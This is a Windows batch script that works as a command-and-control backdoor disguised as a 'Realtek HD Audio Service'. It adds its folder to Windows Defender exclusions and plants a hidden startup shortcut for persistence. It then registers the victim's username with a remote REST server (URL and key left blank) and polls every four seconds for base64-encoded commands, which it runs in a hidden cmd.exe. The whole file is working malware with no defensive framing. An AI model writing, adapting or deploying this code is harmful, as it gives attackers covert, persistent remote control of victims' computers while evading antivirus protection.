@echo off
setlocal enabledelayedexpansion

set "BASE_URL=""
set "API_KEY=""

set "scriptName=Realtek HD Audio Service"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%.lnk"

if "%1"=="--startup" goto :main
if exist "%APPDATA%\%scriptName%.dat" exit /b

powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" 2>nul
if !ERRORLEVEL! EQU 0 (
  call :register
  powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Arguments = '--startup'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"
  echo installed > "%APPDATA%\%scriptName%.dat"
)
exit /b

:main
call :heartbeat
call :fetchCmd
timeout /t 4 /nobreak >nul
goto main

:register
curl -s -X POST "!BASE_URL!/clients" ^
-H "apikey: !API_KEY!" ^
-H "Authorization: Bearer !API_KEY!" ^
-H "Content-Type: application/json" ^
-H "Prefer: resolution=merge-duplicates" ^
-d "{\"username\": \"!USERNAME!\"}" >nul
exit /b

:heartbeat
curl -s -X PATCH "!BASE_URL!/clients?username=eq.!USERNAME!" ^
-H "apikey: !API_KEY!" ^
-H "Authorization: Bearer !API_KEY!" ^
-H "Content-Type: application/json" ^
-d "{\"updated_at\": \"now()\"}" >nul
exit /b

:fetchCmd
powershell -Command "$headers = @{ 'apikey' = '!API_KEY!'; 'Authorization' = 'Bearer !API_KEY!'; 'Content-Type' = 'application/json' }; $url = '!BASE_URL!/clients?select=cmd,run&username=eq.!USERNAME!'; $response = Invoke-RestMethod -Uri $url -Headers $headers; if ($response.run -eq $true) { $patchUrl = '!BASE_URL!/clients?username=eq.!USERNAME!'; Invoke-RestMethod -Method Patch -Uri $patchUrl -Headers $headers -Body '{\"run\": false}'; $decodedCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.cmd)); Start-Process cmd.exe -ArgumentList '/c', $decodedCmd -WindowStyle Hidden; }"
exit /b